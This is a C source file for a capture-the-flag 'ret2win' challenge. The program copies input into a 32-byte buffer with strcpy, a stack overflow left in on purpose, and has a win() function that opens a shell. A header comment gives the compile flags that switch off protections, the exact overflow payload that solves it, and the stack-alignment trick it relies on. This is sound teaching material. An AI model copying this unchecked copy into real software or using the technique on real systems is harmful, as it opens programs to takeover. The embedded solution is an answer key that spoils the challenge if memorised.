#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/*
 * Compile challenge with: gcc -O0 -fno-stack-protector -no-pie ret2win.c -o ret2win
 * Get address of win() function with `readelf -a ret2win | grep win` (address: 0x401256)
 * 
 * Solution:
 * cat <(python3 -c "print('Pinchers of Peril' + 'A'*15 + 'B'*8 + '\x5b\x12\x40')") - | ./ret2win
 * 
 * Returning to the start of win() will cause a segfault because the stack will be misaligned
 * This is triggered in do_system by the `movaps` instruction. To avoid the misalignment, we return
 * 2 instruction in, to avoid the 8-byte push of ebp to the stack, preventing the stack from becoming
 * non-16-byte aligned.
 * 
 * Thanks to these two sources for helping me understand the movaps segfault and stack alignment issue:
 * http://blog.binpang.me/2019/07/12/stack-alignment/#reference
 * https://pwndumb.github.io/posts/Docker-CTF-LiverOverflow-Challenge/
 */

void win() {
    system("/bin/bash");
}

void checkSecret(char* secret) {
    char secretString[32];
    strcpy(secretString, secret);
    if (!strncmp(secretString, "Pinchers of Peril", strlen("Pinchers of Peril"))) {
        puts("That's the secret!");
    } else {
        puts("That's not the secret.");
        exit(-1);
    }
}

int main(int argc, char** argv)
{
    char commandString[256];
    memset(&commandString, 0, 256);

    // prompt user
    fputs("What's the secret? >> ", stdout);
    fflush(stdout);

    // get command remove newline chars
    fgets(commandString, 256, stdin);
    commandString[strcspn(commandString, "\r\n")] = 0;
    checkSecret(commandString);

    puts("Disconnected.");
    return EXIT_SUCCESS;
}
